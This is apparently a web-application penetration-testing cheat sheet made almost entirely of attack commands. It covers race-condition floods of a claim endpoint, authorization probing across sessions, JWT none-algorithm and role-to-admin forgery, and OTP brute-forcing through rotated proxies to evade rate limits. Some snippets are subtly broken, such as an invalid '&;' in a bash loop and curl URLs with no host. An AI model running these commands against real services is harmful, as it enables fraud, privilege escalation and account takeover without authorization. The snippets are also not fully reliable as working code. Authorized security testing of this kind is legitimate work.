# TOOLING — COMMAND REFERENCE

## PARALLEL REQUESTS (Race Conditions)
```bash
# Bash parallel (simple)
for i in {1..50}; do curl -X POST /api/claim -d '{"amount":10}' -H "Cookie: A" &; done; wait

# Python parallel (Turbo Intruder style)
python3 -c "
import threading, requests
def race():
    r = requests.post('https://target.com/api/claim', cookies={'session':'A'}, json={'amount':10})
    print(r.status_code, r.elapsed.total_seconds())
threads = [threading.Thread(target=race) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
"

# Single-packet attack with Burp Turbo Intruder
# py turbo_intruder.py -u 'https://target.com/api/claim' -s '{"amount":10}'
```

## AUTHORIZATION MATRIX
```bash
for session in a b admin; do
  for endpoint in $(cat api_endpoints.txt); do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$endpoint" -b "session=$(cat .session_$session)")
    echo "$session → $endpoint → $code"
  done
done | column -t
```

## FLOW TRACING
```bash
curl -s -D - -X POST /api/login -d '{"email":"a@x.com","pass":"X"}' \
  | grep -E '^(> |< |Set-Cookie|HTTP/)'
```

## JWT TOOLS
```bash
# Decode JWT
jq -R 'split(".") | .[1] | @base64d | fromjson' <<< "$JWT"
# Test none algorithm
jwt_tool "$JWT" -X a
# Change claim
jwt_tool "$JWT" -I -pc role -pv admin
```

## RESPONSE DIFFING
```bash
# Compare two responses
diff <(curl -s /api/resource -H "Cookie: A" | jq --sort-keys .) \
     <(curl -s /api/resource -H "Cookie: B" | jq --sort-keys .)
```

## PROXY ROTATION
```bash
# For rate-limited endpoints
while read proxy; do
  curl -s --proxy "socks5://$proxy" -X POST /api/brute -d '{"otp":"0000"}'
done < proxies.txt
```
